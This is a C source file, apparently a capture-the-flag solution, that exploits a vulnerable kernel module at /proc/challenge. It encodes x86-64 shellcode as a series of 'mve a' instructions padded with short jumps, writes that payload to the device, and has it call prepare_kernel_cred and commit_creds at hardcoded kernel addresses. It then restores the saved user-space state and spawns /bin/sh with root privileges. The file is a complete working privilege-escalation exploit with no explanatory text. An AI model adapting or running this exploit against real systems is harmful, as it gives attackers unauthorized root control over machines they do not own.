/**
 * exploit.c
 * gcc exploit.c -o exploit -static
 */

#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef union uint64_data {
    unsigned char data[8];
    uint64_t      value;
} uint64_data_t;

typedef union uint32_data {
    unsigned char data[4];
    uint32_t      value;
} uint32_data_t;

static uint64_data_t _prepare_kernel_cred[7] = {
    { .data = { 0xbb, 0xff, 0xff, 0xff, 0xff, 0x90, 0xeb, 0x02 } }, // mov ebx, 0xffffffff
    { .data = { 0x48, 0xc1, 0xe3, 0x10, 0x90, 0x90, 0xeb, 0x02 } }, // shl rbx, 0x10
    { .data = { 0x66, 0xbb, 0x08, 0x81, 0x90, 0x90, 0xeb, 0x02 } }, // mov bx, 0x8108
    { .data = { 0x48, 0xc1, 0xe3, 0x10, 0x90, 0x90, 0xeb, 0x02 } }, // shl rbx, 0x10
    { .data = { 0x66, 0xbb, 0x30, 0x4d, 0x90, 0x90, 0xeb, 0x02 } }, // mov bx, 0x4d30
    { .data = { 0x48, 0x31, 0xff, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // xor rdi, rdi
    { .data = { 0xff, 0xd3, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }  // call rbx
};

static uint64_data_t _commit_creds[7] = {
    { .data = { 0xbb, 0xff, 0xff, 0xff, 0xff, 0x90, 0xeb, 0x02 } }, // mov ebx, 0xffffffff
    { .data = { 0x48, 0xc1, 0xe3, 0x10, 0x90, 0x90, 0xeb, 0x02 } }, // shl rbx, 0x10
    { .data = { 0x66, 0xbb, 0x08, 0x81, 0x90, 0x90, 0xeb, 0x02 } }, // mov bx, 0x8108
    { .data = { 0x48, 0xc1, 0xe3, 0x10, 0x90, 0x90, 0xeb, 0x02 } }, // shl rbx, 0x10
    { .data = { 0x66, 0xbb, 0xf0, 0x48, 0x90, 0x90, 0xeb, 0x02 } }, // mov bx, 0x48f0
    { .data = { 0x48, 0x89, 0xc7, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // mov rdi, rax
    { .data = { 0xff, 0xd3, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }  // call rbx
};

uint64_data_t _load_user_space[22] = {
    { .data = { 0xbb, 0xff, 0xff, 0xff, 0xff, 0x90, 0xeb, 0x02 } }, // mov ebx, 0xffffffff
    { .data = { 0x53, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // push rbx
    { .data = { 0xbb, 0xff, 0xff, 0xff, 0xff, 0x90, 0xeb, 0x02 } }, // mov ebx, 0xffffffff
    { .data = { 0x48, 0xc1, 0xe3, 0x10, 0x90, 0x90, 0xeb, 0x02 } }, // shl rbx, 0x10
    { .data = { 0x66, 0xbb, 0xff, 0xff, 0x90, 0x90, 0xeb, 0x02 } }, // mov bx, 0xffff
    { .data = { 0x53, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // push rbx
    { .data = { 0xbb, 0xff, 0xff, 0xff, 0xff, 0x90, 0xeb, 0x02 } }, // mov ebx, 0xffffffff
    { .data = { 0x53, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // push rbx
    { .data = { 0xbb, 0xff, 0xff, 0xff, 0xff, 0x90, 0xeb, 0x02 } }, // mov ebx, 0xffffffff
    { .data = { 0x53, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // push rbx
    { .data = { 0xbb, 0xff, 0xff, 0xff, 0xff, 0x90, 0xeb, 0x02 } }, // mov ebx, 0xffffffff
    { .data = { 0x53, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // push rbx
    { .data = { 0xbb, 0x00, 0x00, 0x00, 0x00, 0x90, 0xeb, 0x02 } }, // mov ebx, 0x00
    { .data = { 0x53, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // push rbx
    { .data = { 0xbb, 0x00, 0x00, 0x00, 0x00, 0x90, 0xeb, 0x02 } }, // mov ebx, 0x00
    { .data = { 0x53, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }, // push rbx
    { .data = { 0xbb, 0xff, 0xff, 0xff, 0xff, 0x90, 0xeb, 0x02 } }, // mov ebx, 0xffffffff
    { .data = { 0x48, 0xc1, 0xe3, 0x10, 0x90, 0x90, 0xeb, 0x02 } }, // shl rbx, 0x10
    { .data = { 0x66, 0xbb, 0xc0, 0x81, 0x90, 0x90, 0xeb, 0x02 } }, // mov bx, 0x81c0
    { .data = { 0x48, 0xc1, 0xe3, 0x10, 0x90, 0x90, 0xeb, 0x02 } }, // shl rbx, 0x10
    { .data = { 0x66, 0xbb, 0x45, 0x0a, 0x90, 0x90, 0xeb, 0x02 } }, // mov bx, 0x0a45
    { .data = { 0xff, 0xe3, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x02 } }  // jmp rbx
};

uint64_t save_ss, save_sp, save_rf, save_cs;

void shell()
{
    printf("[*] success! have a shell ;)\n");
    system("/bin/sh");
}

void init_load_user_space()
{
    uint32_data_t tmp;

    /* mov ebx, save_ss ; push rbx */
    tmp.value = (uint32_t)save_ss;
    memcpy(&(_load_user_space[0].data[1]), tmp.data, sizeof(uint32_t));

    /* mov ebx, (save_sp >> 0x10) ; shl rbx, 0x10 ; mov bx, (save_sp & 0xffff) ; push rbx */
    tmp.value = (uint32_t)(save_sp >> 0x10);
    memcpy(&(_load_user_space[2].data[1]), tmp.data, sizeof(uint32_t));
    tmp.value = (uint32_t)(save_sp & 0xffff);
    memcpy(&(_load_user_space[4].data[2]), tmp.data, sizeof(uint16_t));

    /* mov ebx, save_rf ; push rbx */
    tmp.value = (uint32_t)save_rf;
    memcpy(&(_load_user_space[6].data[1]), tmp.data, sizeof(uint32_t));

    /* mov ebx, save_cs ; push rbx */
    tmp.value = (uint32_t)save_cs;
    memcpy(&(_load_user_space[8].data[1]), tmp.data, sizeof(uint32_t));

    /* mov ebx, &shell ; push rbx */
    tmp.value = (uint32_t)shell;
    memcpy(&(_load_user_space[10].data[1]), tmp.data, sizeof(uint32_t));
}

void save_user_space()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    ); 
}

void generate_payload(char* payload)
{
    char line[100];

    for (int i = 0; i < 7; ++i) {
        sprintf(line, "mve a %lu\n", _prepare_kernel_cred[i].value);
        strcat(payload, line);
    }
    
    for (int i = 0; i < 7; ++i) {
        sprintf(line, "mve a %lu\n", _commit_creds[i].value);
        strcat(payload, line);
    }

    for (int i = 0; i < 22; ++i) {
        sprintf(line, "mve a %lu\n", _load_user_space[i].value);
        strcat(payload, line);
    }

    strcat(payload, "jmp 2");
}

int main(int argc, char** argv)
{
    save_user_space();
    init_load_user_space();

    char payload[0x1000];
    generate_payload(payload);

    printf("[*] generated malicious payload\n");
    printf("%s\n", payload);

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);
    printf("[*] opened /proc/challenge on fd %d\n", fd);

    printf("[*] writing payload to fd %d\n", fd);
    write(fd, payload, strlen(payload) + 1);

    return 0;
}
